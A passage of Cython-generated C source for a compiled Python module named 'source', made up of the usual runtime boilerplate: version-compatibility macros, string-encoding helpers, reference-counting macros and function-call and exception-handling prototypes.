  #define __Pyx_SET_REFCNT(obj, refcnt) Py_REFCNT(obj) = (refcnt)
  #define __Pyx_SET_SIZE(obj, size) Py_SIZE(obj) = (size)
#endif
#if CYTHON_ASSUME_SAFE_MACROS
  #define __Pyx_PySequence_SIZE(seq)  Py_SIZE(seq)
#else
  #define __Pyx_PySequence_SIZE(seq)  PySequence_Size(seq)
#endif
#if PY_MAJOR_VERSION >= 3
  #define PyIntObject                  PyLongObject
  #define PyInt_Type                   PyLong_Type
  #define PyInt_Check(op)              PyLong_Check(op)
  #define PyInt_CheckExact(op)         PyLong_CheckExact(op)
  #define PyInt_FromString             PyLong_FromString
  #define PyInt_FromUnicode            PyLong_FromUnicode
  #define PyInt_FromLong               PyLong_FromLong
  #define PyInt_FromSize_t             PyLong_FromSize_t
  #define PyInt_FromSsize_t            PyLong_FromSsize_t
  #define PyInt_AsLong                 PyLong_AsLong
  #define PyInt_AS_LONG                PyLong_AS_LONG
  #define PyInt_AsSsize_t              PyLong_AsSsize_t
  #define PyInt_AsUnsignedLongMask     PyLong_AsUnsignedLongMask
  #define PyInt_AsUnsignedLongLongMask PyLong_AsUnsignedLongLongMask
  #define PyNumber_Int                 PyNumber_Long
#endif
#if PY_MAJOR_VERSION >= 3
  #define PyBoolObject                 PyLongObject
#endif
#if PY_MAJOR_VERSION >= 3 && CYTHON_COMPILING_IN_PYPY
  #ifndef PyUnicode_InternFromString
    #define PyUnicode_InternFromString(s) PyUnicode_FromString(s)
  #endif
#endif
#if PY_VERSION_HEX < 0x030200A4
  typedef long Py_hash_t;
  #define __Pyx_PyInt_FromHash_t PyInt_FromLong
  #define __Pyx_PyInt_AsHash_t   __Pyx_PyIndex_AsHash_t
#else
  #define __Pyx_PyInt_FromHash_t PyInt_FromSsize_t
  #define __Pyx_PyInt_AsHash_t   __Pyx_PyIndex_AsSsize_t
#endif
#if PY_MAJOR_VERSION >= 3
  #define __Pyx_PyMethod_New(func, self, klass) ((self) ? ((void)(klass), PyMethod_New(func, self)) : __Pyx_NewRef(func))
#else
  #define __Pyx_PyMethod_New(func, self, klass) PyMethod_New(func, self, klass)
#endif
#if CYTHON_USE_ASYNC_SLOTS
  #if PY_VERSION_HEX >= 0x030500B1
    #define __Pyx_PyAsyncMethodsStruct PyAsyncMethods
    #define __Pyx_PyType_AsAsync(obj) (Py_TYPE(obj)->tp_as_async)
  #else
    #define __Pyx_PyType_AsAsync(obj) ((__Pyx_PyAsyncMethodsStruct*) (Py_TYPE(obj)->tp_reserved))
  #endif
#else
  #define __Pyx_PyType_AsAsync(obj) NULL
#endif
#ifndef __Pyx_PyAsyncMethodsStruct
    typedef struct {
        unaryfunc am_await;
        unaryfunc am_aiter;
        unaryfunc am_anext;
    } __Pyx_PyAsyncMethodsStruct;
#endif

#if defined(_WIN32) || defined(WIN32) || defined(MS_WINDOWS)
  #if !defined(_USE_MATH_DEFINES)
    #define _USE_MATH_DEFINES
  #endif
#endif
#include <math.h>
#ifdef NAN
#define __PYX_NAN() ((float) NAN)
#else
static CYTHON_INLINE float __PYX_NAN() {
  float value;
  memset(&value, 0xFF, sizeof(value));
  return value;
}
#endif
#if defined(__CYGWIN__) && defined(_LDBL_EQ_DBL)
#define __Pyx_truncl trunc
#else
#define __Pyx_truncl truncl
#endif

#define __PYX_MARK_ERR_POS(f_index, lineno) \
    { __pyx_filename = __pyx_f[f_index]; (void)__pyx_filename; __pyx_lineno = lineno; (void)__pyx_lineno; __pyx_clineno = __LINE__; (void)__pyx_clineno; }
#define __PYX_ERR(f_index, lineno, Ln_error) \
    { __PYX_MARK_ERR_POS(f_index, lineno) goto Ln_error; }

#ifndef __PYX_EXTERN_C
  #ifdef __cplusplus
    #define __PYX_EXTERN_C extern "C"
  #else
    #define __PYX_EXTERN_C extern
  #endif
#endif

#define __PYX_HAVE__source
#define __PYX_HAVE_API__source
/* Early includes */
#ifdef _OPENMP
#include <omp.h>
#endif /* _OPENMP */

#if defined(PYREX_WITHOUT_ASSERTIONS) && !defined(CYTHON_WITHOUT_ASSERTIONS)
#define CYTHON_WITHOUT_ASSERTIONS
#endif

typedef struct {PyObject **p; const char *s; const Py_ssize_t n; const char* encoding;
                const char is_unicode; const char is_str; const char intern; } __Pyx_StringTabEntry;

#define __PYX_DEFAULT_STRING_ENCODING_IS_ASCII 0
#define __PYX_DEFAULT_STRING_ENCODING_IS_UTF8 0
#define __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT (PY_MAJOR_VERSION >= 3 && __PYX_DEFAULT_STRING_ENCODING_IS_UTF8)
#define __PYX_DEFAULT_STRING_ENCODING ""
#define __Pyx_PyObject_FromString __Pyx_PyBytes_FromString
#define __Pyx_PyObject_FromStringAndSize __Pyx_PyBytes_FromStringAndSize
#define __Pyx_uchar_cast(c) ((unsigned char)c)
#define __Pyx_long_cast(x) ((long)x)
#define __Pyx_fits_Py_ssize_t(v, type, is_signed)  (\
    (sizeof(type) < sizeof(Py_ssize_t))  ||\
    (sizeof(type) > sizeof(Py_ssize_t) &&\
          likely(v < (type)PY_SSIZE_T_MAX ||\
                 v == (type)PY_SSIZE_T_MAX)  &&\
          (!is_signed || likely(v > (type)PY_SSIZE_T_MIN ||\
                                v == (type)PY_SSIZE_T_MIN)))  ||\
    (sizeof(type) == sizeof(Py_ssize_t) &&\
          (is_signed || likely(v < (type)PY_SSIZE_T_MAX ||\
                               v == (type)PY_SSIZE_T_MAX)))  )
static CYTHON_INLINE int __Pyx_is_valid_index(Py_ssize_t i, Py_ssize_t limit) {
    return (size_t) i < (size_t) limit;
}
#if defined (__cplusplus) && __cplusplus >= 201103L
    #include <cstdlib>
    #define __Pyx_sst_abs(value) std::abs(value)
#elif SIZEOF_INT >= SIZEOF_SIZE_T
    #define __Pyx_sst_abs(value) abs(value)
#elif SIZEOF_LONG >= SIZEOF_SIZE_T
    #define __Pyx_sst_abs(value) labs(value)
#elif defined (_MSC_VER)
    #define __Pyx_sst_abs(value) ((Py_ssize_t)_abs64(value))
#elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L
    #define __Pyx_sst_abs(value) llabs(value)
#elif defined (__GNUC__)
    #define __Pyx_sst_abs(value) __builtin_llabs(value)
#else
    #define __Pyx_sst_abs(value) ((value<0) ? -value : value)
#endif
static CYTHON_INLINE const char* __Pyx_PyObject_AsString(PyObject*);
static CYTHON_INLINE const char* __Pyx_PyObject_AsStringAndSize(PyObject*, Py_ssize_t* length);
#define __Pyx_PyByteArray_FromString(s) PyByteArray_FromStringAndSize((const char*)s, strlen((const char*)s))
#define __Pyx_PyByteArray_FromStringAndSize(s, l) PyByteArray_FromStringAndSize((const char*)s, l)
#define __Pyx_PyBytes_FromString        PyBytes_FromString
#define __Pyx_PyBytes_FromStringAndSize PyBytes_FromStringAndSize
static CYTHON_INLINE PyObject* __Pyx_PyUnicode_FromString(const char*);
#if PY_MAJOR_VERSION < 3
    #define __Pyx_PyStr_FromString        __Pyx_PyBytes_FromString
    #define __Pyx_PyStr_FromStringAndSize __Pyx_PyBytes_FromStringAndSize
#else
    #define __Pyx_PyStr_FromString        __Pyx_PyUnicode_FromString
    #define __Pyx_PyStr_FromStringAndSize __Pyx_PyUnicode_FromStringAndSize
#endif
#define __Pyx_PyBytes_AsWritableString(s)     ((char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsWritableSString(s)    ((signed char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsWritableUString(s)    ((unsigned char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsString(s)     ((const char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsSString(s)    ((const signed char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsUString(s)    ((const unsigned char*) PyBytes_AS_STRING(s))
#define __Pyx_PyObject_AsWritableString(s)    ((char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsWritableSString(s)    ((signed char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsWritableUString(s)    ((unsigned char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsSString(s)    ((const signed char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsUString(s)    ((const unsigned char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_FromCString(s)  __Pyx_PyObject_FromString((const char*)s)
#define __Pyx_PyBytes_FromCString(s)   __Pyx_PyBytes_FromString((const char*)s)
#define __Pyx_PyByteArray_FromCString(s)   __Pyx_PyByteArray_FromString((const char*)s)
#define __Pyx_PyStr_FromCString(s)     __Pyx_PyStr_FromString((const char*)s)
#define __Pyx_PyUnicode_FromCString(s) __Pyx_PyUnicode_FromString((const char*)s)
static CYTHON_INLINE size_t __Pyx_Py_UNICODE_strlen(const Py_UNICODE *u) {
    const Py_UNICODE *u_end = u;
    while (*u_end++) ;
    return (size_t)(u_end - u - 1);
}
#define __Pyx_PyUnicode_FromUnicode(u)       PyUnicode_FromUnicode(u, __Pyx_Py_UNICODE_strlen(u))
#define __Pyx_PyUnicode_FromUnicodeAndLength PyUnicode_FromUnicode
#define __Pyx_PyUnicode_AsUnicode            PyUnicode_AsUnicode
#define __Pyx_NewRef(obj) (Py_INCREF(obj), obj)
#define __Pyx_Owned_Py_None(b) __Pyx_NewRef(Py_None)
static CYTHON_INLINE PyObject * __Pyx_PyBool_FromLong(long b);
static CYTHON_INLINE int __Pyx_PyObject_IsTrue(PyObject*);
static CYTHON_INLINE int __Pyx_PyObject_IsTrueAndDecref(PyObject*);
static CYTHON_INLINE PyObject* __Pyx_PyNumber_IntOrLong(PyObject* x);
#define __Pyx_PySequence_Tuple(obj)\
    (likely(PyTuple_CheckExact(obj)) ? __Pyx_NewRef(obj) : PySequence_Tuple(obj))
static CYTHON_INLINE Py_ssize_t __Pyx_PyIndex_AsSsize_t(PyObject*);
static CYTHON_INLINE PyObject * __Pyx_PyInt_FromSize_t(size_t);
static CYTHON_INLINE Py_hash_t __Pyx_PyIndex_AsHash_t(PyObject*);
#if CYTHON_ASSUME_SAFE_MACROS
#define __pyx_PyFloat_AsDouble(x) (PyFloat_CheckExact(x) ? PyFloat_AS_DOUBLE(x) : PyFloat_AsDouble(x))
#else
#define __pyx_PyFloat_AsDouble(x) PyFloat_AsDouble(x)
#endif
#define __pyx_PyFloat_AsFloat(x) ((float) __pyx_PyFloat_AsDouble(x))
#if PY_MAJOR_VERSION >= 3
#define __Pyx_PyNumber_Int(x) (PyLong_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Long(x))
#else
#define __Pyx_PyNumber_Int(x) (PyInt_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Int(x))
#endif
#define __Pyx_PyNumber_Float(x) (PyFloat_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Float(x))
#if PY_MAJOR_VERSION < 3 && __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
static int __Pyx_sys_getdefaultencoding_not_ascii;
static int __Pyx_init_sys_getdefaultencoding_params(void) {
    PyObject* sys;
    PyObject* default_encoding = NULL;
    PyObject* ascii_chars_u = NULL;
    PyObject* ascii_chars_b = NULL;
    const char* default_encoding_c;
    sys = PyImport_ImportModule("sys");
    if (!sys) goto bad;
    default_encoding = PyObject_CallMethod(sys, (char*) "getdefaultencoding", NULL);
    Py_DECREF(sys);
    if (!default_encoding) goto bad;
    default_encoding_c = PyBytes_AsString(default_encoding);
    if (!default_encoding_c) goto bad;
    if (strcmp(default_encoding_c, "ascii") == 0) {
        __Pyx_sys_getdefaultencoding_not_ascii = 0;
    } else {
        char ascii_chars[128];
        int c;
        for (c = 0; c < 128; c++) {
            ascii_chars[c] = c;
        }
        __Pyx_sys_getdefaultencoding_not_ascii = 1;
        ascii_chars_u = PyUnicode_DecodeASCII(ascii_chars, 128, NULL);
        if (!ascii_chars_u) goto bad;
        ascii_chars_b = PyUnicode_AsEncodedString(ascii_chars_u, default_encoding_c, NULL);
        if (!ascii_chars_b || !PyBytes_Check(ascii_chars_b) || memcmp(ascii_chars, PyBytes_AS_STRING(ascii_chars_b), 128) != 0) {
            PyErr_Format(
                PyExc_ValueError,
                "This module compiled with c_string_encoding=ascii, but default encoding '%.200s' is not a superset of ascii.",
                default_encoding_c);
            goto bad;
        }
        Py_DECREF(ascii_chars_u);
        Py_DECREF(ascii_chars_b);
    }
    Py_DECREF(default_encoding);
    return 0;
bad:
    Py_XDECREF(default_encoding);
    Py_XDECREF(ascii_chars_u);
    Py_XDECREF(ascii_chars_b);
    return -1;
}
#endif
#if __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT && PY_MAJOR_VERSION >= 3
#define __Pyx_PyUnicode_FromStringAndSize(c_str, size) PyUnicode_DecodeUTF8(c_str, size, NULL)
#else
#define __Pyx_PyUnicode_FromStringAndSize(c_str, size) PyUnicode_Decode(c_str, size, __PYX_DEFAULT_STRING_ENCODING, NULL)
#if __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
static char* __PYX_DEFAULT_STRING_ENCODING;
static int __Pyx_init_sys_getdefaultencoding_params(void) {
    PyObject* sys;
    PyObject* default_encoding = NULL;
    char* default_encoding_c;
    sys = PyImport_ImportModule("sys");
    if (!sys) goto bad;
    default_encoding = PyObject_CallMethod(sys, (char*) (const char*) "getdefaultencoding", NULL);
    Py_DECREF(sys);
    if (!default_encoding) goto bad;
    default_encoding_c = PyBytes_AsString(default_encoding);
    if (!default_encoding_c) goto bad;
    __PYX_DEFAULT_STRING_ENCODING = (char*) malloc(strlen(default_encoding_c) + 1);
    if (!__PYX_DEFAULT_STRING_ENCODING) goto bad;
    strcpy(__PYX_DEFAULT_STRING_ENCODING, default_encoding_c);
    Py_DECREF(default_encoding);
    return 0;
bad:
    Py_XDECREF(default_encoding);
    return -1;
}
#endif
#endif


/* Test for GCC > 2.95 */
#if defined(__GNUC__)     && (__GNUC__ > 2 || (__GNUC__ == 2 && (__GNUC_MINOR__ > 95)))
  #define likely(x)   __builtin_expect(!!(x), 1)
  #define unlikely(x) __builtin_expect(!!(x), 0)
#else /* !__GNUC__ or GCC < 2.95 */
  #define likely(x)   (x)
  #define unlikely(x) (x)
#endif /* __GNUC__ */
static CYTHON_INLINE void __Pyx_pretend_to_initialize(void* ptr) { (void)ptr; }

static PyObject *__pyx_m = NULL;
static PyObject *__pyx_d;
static PyObject *__pyx_b;
static PyObject *__pyx_cython_runtime = NULL;
static PyObject *__pyx_empty_tuple;
static PyObject *__pyx_empty_bytes;
static PyObject *__pyx_empty_unicode;
static int __pyx_lineno;
static int __pyx_clineno = 0;
static const char * __pyx_cfilenm= __FILE__;
static const char *__pyx_filename;


static const char *__pyx_f[] = {
  "source.py",
};

/*--- Type declarations ---*/

/* --- Runtime support code (head) --- */
/* Refnanny.proto */
#ifndef CYTHON_REFNANNY
  #define CYTHON_REFNANNY 0
#endif
#if CYTHON_REFNANNY
  typedef struct {
    void (*INCREF)(void*, PyObject*, int);
    void (*DECREF)(void*, PyObject*, int);
    void (*GOTREF)(void*, PyObject*, int);
    void (*GIVEREF)(void*, PyObject*, int);
    void* (*SetupContext)(const char*, int, const char*);
    void (*FinishContext)(void**);
  } __Pyx_RefNannyAPIStruct;
  static __Pyx_RefNannyAPIStruct *__Pyx_RefNanny = NULL;
  static __Pyx_RefNannyAPIStruct *__Pyx_RefNannyImportAPI(const char *modname);
  #define __Pyx_RefNannyDeclarations void *__pyx_refnanny = NULL;
#ifdef WITH_THREAD
  #define __Pyx_RefNannySetupContext(name, acquire_gil)\
          if (acquire_gil) {\
              PyGILState_STATE __pyx_gilstate_save = PyGILState_Ensure();\
              __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__);\
              PyGILState_Release(__pyx_gilstate_save);\
          } else {\
              __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__);\
          }
#else
  #define __Pyx_RefNannySetupContext(name, acquire_gil)\
          __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__)
#endif
  #define __Pyx_RefNannyFinishContext()\
          __Pyx_RefNanny->FinishContext(&__pyx_refnanny)
  #define __Pyx_INCREF(r)  __Pyx_RefNanny->INCREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_DECREF(r)  __Pyx_RefNanny->DECREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_GOTREF(r)  __Pyx_RefNanny->GOTREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_GIVEREF(r) __Pyx_RefNanny->GIVEREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_XINCREF(r)  do { if((r) != NULL) {__Pyx_INCREF(r); }} while(0)
  #define __Pyx_XDECREF(r)  do { if((r) != NULL) {__Pyx_DECREF(r); }} while(0)
  #define __Pyx_XGOTREF(r)  do { if((r) != NULL) {__Pyx_GOTREF(r); }} while(0)
  #define __Pyx_XGIVEREF(r) do { if((r) != NULL) {__Pyx_GIVEREF(r);}} while(0)
#else
  #define __Pyx_RefNannyDeclarations
  #define __Pyx_RefNannySetupContext(name, acquire_gil)
  #define __Pyx_RefNannyFinishContext()
  #define __Pyx_INCREF(r) Py_INCREF(r)
  #define __Pyx_DECREF(r) Py_DECREF(r)
  #define __Pyx_GOTREF(r)
  #define __Pyx_GIVEREF(r)
  #define __Pyx_XINCREF(r) Py_XINCREF(r)
  #define __Pyx_XDECREF(r) Py_XDECREF(r)
  #define __Pyx_XGOTREF(r)
  #define __Pyx_XGIVEREF(r)
#endif
#define __Pyx_XDECREF_SET(r, v) do {\
        PyObject *tmp = (PyObject *) r;\
        r = v; __Pyx_XDECREF(tmp);\
    } while (0)
#define __Pyx_DECREF_SET(r, v) do {\
        PyObject *tmp = (PyObject *) r;\
        r = v; __Pyx_DECREF(tmp);\
    } while (0)
#define __Pyx_CLEAR(r)    do { PyObject* tmp = ((PyObject*)(r)); r = NULL; __Pyx_DECREF(tmp);} while(0)
#define __Pyx_XCLEAR(r)   do { if((r) != NULL) {PyObject* tmp = ((PyObject*)(r)); r = NULL; __Pyx_DECREF(tmp);}} while(0)

/* PyObjectGetAttrStr.proto */
#if CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStr(PyObject* obj, PyObject* attr_name);
#else
#define __Pyx_PyObject_GetAttrStr(o,n) PyObject_GetAttr(o,n)
#endif

/* GetBuiltinName.proto */
static PyObject *__Pyx_GetBuiltinName(PyObject *name);

/* Import.proto */
static PyObject *__Pyx_Import(PyObject *name, PyObject *from_list, int level);

/* PyDictVersioning.proto */
#if CYTHON_USE_DICT_VERSIONS && CYTHON_USE_TYPE_SLOTS
#define __PYX_DICT_VERSION_INIT  ((PY_UINT64_T) -1)
#define __PYX_GET_DICT_VERSION(dict)  (((PyDictObject*)(dict))->ma_version_tag)
#define __PYX_UPDATE_DICT_CACHE(dict, value, cache_var, version_var)\
    (version_var) = __PYX_GET_DICT_VERSION(dict);\
    (cache_var) = (value);
#define __PYX_PY_DICT_LOOKUP_IF_MODIFIED(VAR, DICT, LOOKUP) {\
    static PY_UINT64_T __pyx_dict_version = 0;\
    static PyObject *__pyx_dict_cached_value = NULL;\
    if (likely(__PYX_GET_DICT_VERSION(DICT) == __pyx_dict_version)) {\
        (VAR) = __pyx_dict_cached_value;\
    } else {\
        (VAR) = __pyx_dict_cached_value = (LOOKUP);\
        __pyx_dict_version = __PYX_GET_DICT_VERSION(DICT);\
    }\
}
static CYTHON_INLINE PY_UINT64_T __Pyx_get_tp_dict_version(PyObject *obj);
static CYTHON_INLINE PY_UINT64_T __Pyx_get_object_dict_version(PyObject *obj);
static CYTHON_INLINE int __Pyx_object_dict_version_matches(PyObject* obj, PY_UINT64_T tp_dict_version, PY_UINT64_T obj_dict_version);
#else
#define __PYX_GET_DICT_VERSION(dict)  (0)
#define __PYX_UPDATE_DICT_CACHE(dict, value, cache_var, version_var)
#define __PYX_PY_DICT_LOOKUP_IF_MODIFIED(VAR, DICT, LOOKUP)  (VAR) = (LOOKUP);
#endif

/* GetModuleGlobalName.proto */
#if CYTHON_USE_DICT_VERSIONS
#define __Pyx_GetModuleGlobalName(var, name)  do {\
    static PY_UINT64_T __pyx_dict_version = 0;\
    static PyObject *__pyx_dict_cached_value = NULL;\
    (var) = (likely(__pyx_dict_version == __PYX_GET_DICT_VERSION(__pyx_d))) ?\
        (likely(__pyx_dict_cached_value) ? __Pyx_NewRef(__pyx_dict_cached_value) : __Pyx_GetBuiltinName(name)) :\
        __Pyx__GetModuleGlobalName(name, &__pyx_dict_version, &__pyx_dict_cached_value);\
} while(0)
#define __Pyx_GetModuleGlobalNameUncached(var, name)  do {\
    PY_UINT64_T __pyx_dict_version;\
    PyObject *__pyx_dict_cached_value;\
    (var) = __Pyx__GetModuleGlobalName(name, &__pyx_dict_version, &__pyx_dict_cached_value);\
} while(0)
static PyObject *__Pyx__GetModuleGlobalName(PyObject *name, PY_UINT64_T *dict_version, PyObject **dict_cached_value);
#else
#define __Pyx_GetModuleGlobalName(var, name)  (var) = __Pyx__GetModuleGlobalName(name)
#define __Pyx_GetModuleGlobalNameUncached(var, name)  (var) = __Pyx__GetModuleGlobalName(name)
static CYTHON_INLINE PyObject *__Pyx__GetModuleGlobalName(PyObject *name);
#endif

/* PyCFunctionFastCall.proto */
#if CYTHON_FAST_PYCCALL
static CYTHON_INLINE PyObject *__Pyx_PyCFunction_FastCall(PyObject *func, PyObject **args, Py_ssize_t nargs);
#else
#define __Pyx_PyCFunction_FastCall(func, args, nargs)  (assert(0), NULL)
#endif

/* PyFunctionFastCall.proto */
#if CYTHON_FAST_PYCALL
#define __Pyx_PyFunction_FastCall(func, args, nargs)\
    __Pyx_PyFunction_FastCallDict((func), (args), (nargs), NULL)
#if 1 || PY_VERSION_HEX < 0x030600B1
static PyObject *__Pyx_PyFunction_FastCallDict(PyObject *func, PyObject **args, Py_ssize_t nargs, PyObject *kwargs);
#else
#define __Pyx_PyFunction_FastCallDict(func, args, nargs, kwargs) _PyFunction_FastCallDict(func, args, nargs, kwargs)
#endif
#define __Pyx_BUILD_ASSERT_EXPR(cond)\
    (sizeof(char [1 - 2*!(cond)]) - 1)
#ifndef Py_MEMBER_SIZE
#define Py_MEMBER_SIZE(type, member) sizeof(((type *)0)->member)
#endif
#if CYTHON_FAST_PYCALL
  static size_t __pyx_pyframe_localsplus_offset = 0;
  #include "frameobject.h"
#if PY_VERSION_HEX >= 0x030b00a6
  #ifndef Py_BUILD_CORE
    #define Py_BUILD_CORE 1
  #endif
  #include "internal/pycore_frame.h"
#endif
  #define __Pxy_PyFrame_Initialize_Offsets()\
    ((void)__Pyx_BUILD_ASSERT_EXPR(sizeof(PyFrameObject) == offsetof(PyFrameObject, f_localsplus) + Py_MEMBER_SIZE(PyFrameObject, f_localsplus)),\
     (void)(__pyx_pyframe_localsplus_offset = ((size_t)PyFrame_Type.tp_basicsize) - Py_MEMBER_SIZE(PyFrameObject, f_localsplus)))
  #define __Pyx_PyFrame_GetLocalsplus(frame)\
    (assert(__pyx_pyframe_localsplus_offset), (PyObject **)(((char *)(frame)) + __pyx_pyframe_localsplus_offset))
#endif // CYTHON_FAST_PYCALL
#endif

/* PyObjectCall.proto */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_Call(PyObject *func, PyObject *arg, PyObject *kw);
#else
#define __Pyx_PyObject_Call(func, arg, kw) PyObject_Call(func, arg, kw)
#endif

/* PyObjectCallMethO.proto */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallMethO(PyObject *func, PyObject *arg);
#endif

/* PyObjectCallOneArg.proto */
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallOneArg(PyObject *func, PyObject *arg);

/* GetItemInt.proto */
#define __Pyx_GetItemInt(o, i, type, is_signed, to_py_func, is_list, wraparound, boundscheck)\
    (__Pyx_fits_Py_ssize_t(i, type, is_signed) ?\
    __Pyx_GetItemInt_Fast(o, (Py_ssize_t)i, is_list, wraparound, boundscheck) :\
    (is_list ? (PyErr_SetString(PyExc_IndexError, "list index out of range"), (PyObject*)NULL) :\
               __Pyx_GetItemInt_Generic(o, to_py_func(i))))
#define __Pyx_GetItemInt_List(o, i, type, is_signed, to_py_func, is_list, wraparound, boundscheck)\
    (__Pyx_fits_Py_ssize_t(i, type, is_signed) ?\
    __Pyx_GetItemInt_List_Fast(o, (Py_ssize_t)i, wraparound, boundscheck) :\
    (PyErr_SetString(PyExc_IndexError, "list index out of range"), (PyObject*)NULL))
static CYTHON_INLINE PyObject *__Pyx_GetItemInt_List_Fast(PyObject *o, Py_ssize_t i,
                                                              int wraparound, int boundscheck);
#define __Pyx_GetItemInt_Tuple(o, i, type, is_signed, to_py_func, is_list, wraparound, boundscheck)\
    (__Pyx_fits_Py_ssize_t(i, type, is_signed) ?\
    __Pyx_GetItemInt_Tuple_Fast(o, (Py_ssize_t)i, wraparound, boundscheck) :\
    (PyErr_SetString(PyExc_IndexError, "tuple index out of range"), (PyObject*)NULL))
static CYTHON_INLINE PyObject *__Pyx_GetItemInt_Tuple_Fast(PyObject *o, Py_ssize_t i,
                                                              int wraparound, int boundscheck);
static PyObject *__Pyx_GetItemInt_Generic(PyObject *o, PyObject* j);
static CYTHON_INLINE PyObject *__Pyx_GetItemInt_Fast(PyObject *o, Py_ssize_t i,
                                                     int is_list, int wraparound, int boundscheck);

/* SliceObject.proto */
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetSlice(
        PyObject* obj, Py_ssize_t cstart, Py_ssize_t cstop,
        PyObject** py_start, PyObject** py_stop, PyObject** py_slice,
        int has_cstart, int has_cstop, int wraparound);

/* PyObjectLookupSpecial.proto */
#if CYTHON_USE_PYTYPE_LOOKUP && CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PyObject* __Pyx_PyObject_LookupSpecial(PyObject* obj, PyObject* attr_name) {
    PyObject *res;
    PyTypeObject *tp = Py_TYPE(obj);
#if PY_MAJOR_VERSION < 3
    if (unlikely(PyInstance_Check(obj)))
        return __Pyx_PyObject_GetAttrStr(obj, attr_name);
#endif
    res = _PyType_Lookup(tp, attr_name);
    if (likely(res)) {
        descrgetfunc f = Py_TYPE(res)->tp_descr_get;
        if (!f) {
            Py_INCREF(res);
        } else {
            res = f(res, obj, (PyObject *)tp);
        }
    } else {
        PyErr_SetObject(PyExc_AttributeError, attr_name);
    }
    return res;
}
#else
#define __Pyx_PyObject_LookupSpecial(o,n) __Pyx_PyObject_GetAttrStr(o,n)
#endif

/* PyObjectCallNoArg.proto */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallNoArg(PyObject *func);
#else
#define __Pyx_PyObject_CallNoArg(func) __Pyx_PyObject_Call(func, __pyx_empty_tuple, NULL)
#endif

/* GetTopmostException.proto */
#if CYTHON_USE_EXC_INFO_STACK
static _PyErr_StackItem * __Pyx_PyErr_GetTopmostException(PyThreadState *tstate);
#endif

/* PyThreadStateGet.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_PyThreadState_declare  PyThreadState *__pyx_tstate;
#define __Pyx_PyThreadState_assign  __pyx_tstate = __Pyx_PyThreadState_Current;
#define __Pyx_PyErr_Occurred()  __pyx_tstate->curexc_type
#else
#define __Pyx_PyThreadState_declare
#define __Pyx_PyThreadState_assign
#define __Pyx_PyErr_Occurred()  PyErr_Occurred()
#endif

/* SaveResetException.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_ExceptionSave(type, value, tb)  __Pyx__ExceptionSave(__pyx_tstate, type, value, tb)
static CYTHON_INLINE void __Pyx__ExceptionSave(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);
#define __Pyx_ExceptionReset(type, value, tb)  __Pyx__ExceptionReset(__pyx_tstate, type, value, tb)
static CYTHON_INLINE void __Pyx__ExceptionReset(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb);
#else
#define __Pyx_ExceptionSave(type, value, tb)   PyErr_GetExcInfo(type, value, tb)
#define __Pyx_ExceptionReset(type, value, tb)  PyErr_SetExcInfo(type, value, tb)
#endif

/* GetException.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_GetException(type, value, tb)  __Pyx__GetException(__pyx_tstate, type, value, tb)
static int __Pyx__GetException(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);
#else
static int __Pyx_GetException(PyObject **type, PyObject **value, PyObject **tb);
#endif

/* PyErrFetchRestore.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_PyErr_Clear() __Pyx_ErrRestore(NULL, NULL, NULL)
#define __Pyx_ErrRestoreWithState(type, value, tb)  __Pyx_ErrRestoreInState(PyThreadState_GET(), type, value, tb)
#define __Pyx_ErrFetchWithState(type, value, tb)    __Pyx_ErrFetchInState(PyThreadState_GET(), type, value, tb)
#define __Pyx_ErrRestore(type, value, tb)  __Pyx_ErrRestoreInState(__pyx_tstate, type, value, tb)
#define __Pyx_ErrFetch(type, value, tb)    __Pyx_ErrFetchInState(__pyx_tstate, type, value, tb)
static CYTHON_INLINE void __Pyx_ErrRestoreInState(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb);
static CYTHON_INLINE void __Pyx_ErrFetchInState(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);
#if CYTHON_COMPILING_IN_CPYTHON
#define __Pyx_PyErr_SetNone(exc) (Py_INCREF(exc), __Pyx_ErrRestore((exc), NULL, NULL))
#else
#define __Pyx_PyErr_SetNone(exc) PyErr_SetNone(exc)
#endif
#else
